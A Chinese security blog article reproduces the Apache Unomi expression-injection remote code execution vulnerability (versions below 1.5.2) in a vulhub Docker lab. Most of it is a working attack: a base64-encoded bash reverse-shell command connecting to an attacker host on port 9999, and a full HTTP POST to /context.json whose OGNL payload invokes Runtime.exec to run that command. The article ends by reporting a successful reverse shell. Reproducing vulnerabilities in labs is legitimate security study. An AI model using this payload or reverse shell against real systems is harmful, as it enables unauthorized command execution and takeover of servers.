> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/G4Pfte6IgKAhLxHqTUQUaQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif)  

Apache Unomi 是一个基于标准的客户数据平台（CDP，Customer Data Platform），用于管理在线客户和访客等信息，以提供符合访客隐私规则的个性化体验。在 Apache Unomi 1.5.1 级以前版本中，存在一处表达式注入漏洞，远程攻击者通过 MVEL 和 OGNL 表达式即可在目标服务器上执行任意命令。

  
**影响版本:**  
Apache Unomi < 1.5.2  
**漏洞复现:**  
使用 vulhub 搭建 docker 环境，访问主页 http://192.168.10.128:8181/

 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLibuTnYgAYcNpgarKEWmOk6boTYicFGpXUJ9tXE1BjiaurJEKjibxva37DuPuBMiaMibcE4Fmedx8S8QnJQ/640?wx_fmt=png) 

  
将 bash 命令进行编码

（网站：http://www.jackson-t.ca/runtime-exec-payloads.html）

```
bash -c {echo,YmFzaCAtaSA JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjEzNC85OTk5IDA JjE=}|{base64,-d}|{bash,-i}
```

  
 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLibuTnYgAYcNpgarKEWmOk6bia0ktDeyzb3h3P2QE6icpMDzjtUz6yYaokS4IPHUl60jv9MOHgL5SuicA/640?wx_fmt=png)   
监听端口  
 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLibuTnYgAYcNpgarKEWmOk6b1d8QQxMpJra87KVhBI7On1X5loUr1U5Aic5fuRTy5GxfT8Y3VnxEfvQ/640?wx_fmt=png)   
抓包执行 poc  

```
POST /context.json HTTP/1.1
Host: 192.168.10.128:8181
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 1142

{
  "personalizations":[
    {
      "id":"gender-test",
      "strategy":"matching-first",
      "strategyOptions":{
        "fallback":"var2"
      },
      "contents":[
        {
          "filters":[
            {
              "condition":{
                "parameterValues":{
                  "propertyName":"(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\"bash -c {echo,YmFzaCAtaSA JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjEzNC85OTk5IDA JjE=}|{base64,-d}|{bash,-i}iid\"))",
                  "comparisonOperator":"equals",
                  "propertyValue":"male"
                },
                "type":"profilePropertyCondition"
              }
            }
          ]
        }
      ]
    }
  ],
  "sessionId":"sample"
}
```

 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLibuTnYgAYcNpgarKEWmOk6bQVP952G9hBZLILrp7aEpsAWshsGv1WOhrQhIHV6rMxIU8h3sKhpQCg/640?wx_fmt=png)   
反弹 shell 成功  
![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLibuTnYgAYcNpgarKEWmOk6bbsQ5zIia06t4lDFzJBFH43Wjb49BR8M9XC5dOxSczQtj6IQMq71llHA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/3xxicXNlTXLicjiasf4mjVyxw4RbQt9odm9nxs9434icI9TG8AXHjS3Btc6nTWgSPGkvvXMb7jzFUTbWP7TKu6EJ6g/640?wx_fmt=jpeg)

推荐文章 ++++

![](https://mmbiz.qpic.cn/mmbiz_jpg/US10Gcd0tQFGib3mCxJr4oMx1yp1ExzTETemWvK6Zkd7tVl23CVBppz63sRECqYNkQsonScb65VaG9yU2YJibxNA/640?wx_fmt=jpeg)

*[nginx_parsing_vulnerability nignx 解析漏洞复现](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650495344&idx=3&sn=ea4023048dab524c675fcd0a48cd953a&chksm=83ba3c94b4cdb5825debc2a28aeed6637fe5226938c4e6ca2d68bbc09486910fb5e8124b57b5&scene=21#wechat_redirect)  

*[Apache Shiro 1.2.4 反序列化漏洞复现（CVE-2016-4437）](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650494540&idx=4&sn=7a0a2f2cb5508dd7582d7d80602b96ad&chksm=83ba33a8b4cdbabe575476e581209631877526b63dd96f7cb15881d12c50a2b6d0daae4ff78f&scene=21#wechat_redirect)

*[Ubuntu 漏洞复现](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650492546&idx=3&sn=aa9f2bcb6ef0aaad63d5b4c38f8e6ec1&chksm=83ba2b66b4cda270ebe240068b7e7af628f18bf676e80ec5aa487bc72fc67e0fde6847a72987&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0FWIDRa9Kwh52ibXkf9AAkntMYBpLvaibEiaVibzNO1jiaVV7eSibPuMU3mZfCK8fWz6LicAAzHOM8bZUw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/NZycfjXibQzlug4f7dWSUNbmSAia9VeEY0umcbm5fPmqdHj2d12xlsic4wefHeHYJsxjlaMSJKHAJxHnr1S24t5DQ/640?wx_fmt=gif)